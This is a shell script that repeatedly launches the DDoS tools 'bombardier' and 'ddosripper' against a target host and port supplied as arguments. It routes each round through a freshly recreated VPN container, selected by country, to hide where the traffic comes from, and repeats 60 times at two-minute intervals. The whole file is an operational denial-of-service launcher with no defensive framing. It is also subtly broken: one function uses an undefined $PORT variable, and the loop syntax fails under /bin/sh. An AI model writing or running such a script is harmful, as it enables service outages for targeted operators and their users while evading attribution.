#!/bin/sh

bombardier()
{
    export VPN_CODE=$3
    export VPN_COUNTRY=$4
    export TARGET_PORT=$2
    export B_TARGET_URL="https://$1:$PORT"
    for i in {1..60}
    do
        echo "Running bombardier $i time. $VPN_CODE $VPN_COUNTRY $B_TARGET_URL"
        sudo -E docker-compose down
        sudo -E docker-compose up -d --force-recreate vpn 
        sleep 10s
        sudo -E docker-compose run test
        sudo -E docker-compose run -d bombardier
        echo "Executing bombardier..."
        sleep 10s
        id=$(sudo docker-compose ps -q bombardier)
        echo "Logs:"
        sudo docker logs --since 10s $id
        sleep 120s
        sudo -E docker-compose down
    done
}

ddosripper()
{
    export VPN_CODE=$3
    export VPN_COUNTRY=$4
    export TARGET_PORT=$2
    export R_TARGET_URL=$1
    for i in {1..60}
    do
        echo "Running ddosripper $i time. $VPN_CODE $VPN_COUNTRY $R_TARGET_URL"
        sudo -E docker-compose down
        sudo -E docker-compose up -d --force-recreate vpn 
        sleep 10s
        sudo -E docker-compose run test
        sudo -E docker-compose run -d ddosripper
        echo "Executing ddosripper..."
        sleep 10s
        echo "Logs:"
        id=$(sudo docker-compose ps -q ddosripper)
        sudo docker logs --since 10s $id
        sleep 120s
        sudo -E docker-compose down
    done
}
checksites(){
    export VPN_CODE=$1
    export VPN_COUNTRY=$2
    for i in {1..60}
    do
        echo "Running checksites $i time. $VPN_CODE $VPN_COUNTRY"
        sudo -E docker-compose down
        sudo -E docker-compose up -d --force-recreate vpn 
        sleep 10s
        sudo -E docker-compose run test
        sudo -E docker-compose run -d checksites
        echo "Executing checksites..."
        sleep 10s
        echo "Logs:"
        id=$(sudo docker-compose ps -q checksites)
        sudo docker logs --since 10s $id
        sleep 120s
        sudo -E docker-compose down
    done
}
all(){
    export VPN_CODE=$3
    export VPN_COUNTRY=$4
    export TARGET_PORT=$2
    export B_TARGET_URL="https://$1:$TARGET_PORT"
    export R_TARGET_URL=$1
    for i in {1..60}
    do
        echo "Running all $i time. $VPN_CODE $VPN_COUNTRY $B_TARGET_URL $R_TARGET_URL"
        sudo -E docker-compose down
        sudo -E docker-compose up -d --force-recreate vpn 
        sleep 10s
        sudo -E docker-compose run test
        echo "Executing..."
        sudo -E docker-compose run -d checksites ddosripper bombardier
        sleep 10s
        echo "Logs:"
        sudo docker-compose logs
        sleep 120s
        sudo -E docker-compose down
    done
}